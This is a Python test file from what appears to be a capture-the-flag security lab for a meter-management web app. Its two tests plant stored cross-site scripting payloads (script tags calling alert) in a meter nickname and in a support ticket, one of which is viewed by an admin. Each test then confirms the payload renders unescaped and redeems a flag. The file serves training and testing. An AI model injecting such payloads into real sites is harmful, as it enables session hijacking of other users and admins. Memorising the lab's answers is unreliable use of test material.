import re

NICKNAME_ACTION_RE = re.compile(r"/meters/(\d+)/nickname")


def _own_meter_id(session, base_url):
    resp = session.get(f"{base_url}/dashboard", timeout=10)
    m = NICKNAME_ACTION_RE.search(resp.text)
    assert m, "couldn't find a meter nickname form on the dashboard"
    return m.group(1)


def test_sxss_teach_nickname(alice, base_url, extract_flag_fn, redeem_flag_fn):
    meter_id = _own_meter_id(alice, base_url)
    payload = "<script>alert(document.title)</script>"
    resp = alice.post(f"{base_url}/meters/{meter_id}/nickname", data={"nickname": payload}, timeout=10)
    assert resp.status_code in (200, 302)

    resp = alice.get(f"{base_url}/dashboard", timeout=10)
    # The vulnerability: the stored nickname renders unescaped.
    assert payload in resp.text
    # The flag itself is baked into <title> on every dashboard load.
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_sxss_exercise_support_ticket(alice, ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "<script>alert(document.querySelector('meta[name=wg-ctx]').content)</script>"
    resp = alice.post(
        f"{base_url}/support",
        data={"subject": "SXSS test", "description": payload},
        timeout=10,
    )
    assert resp.status_code == 200

    resp = ops1_admin.get(f"{base_url}/admin/tickets", timeout=10)
    assert resp.status_code == 200
    assert payload in resp.text  # unescaped ticket description
    flag = extract_flag_fn(resp.text)  # <meta name="wg-ctx"> flag
    assert redeem_flag_fn(ops1_admin, base_url, flag)
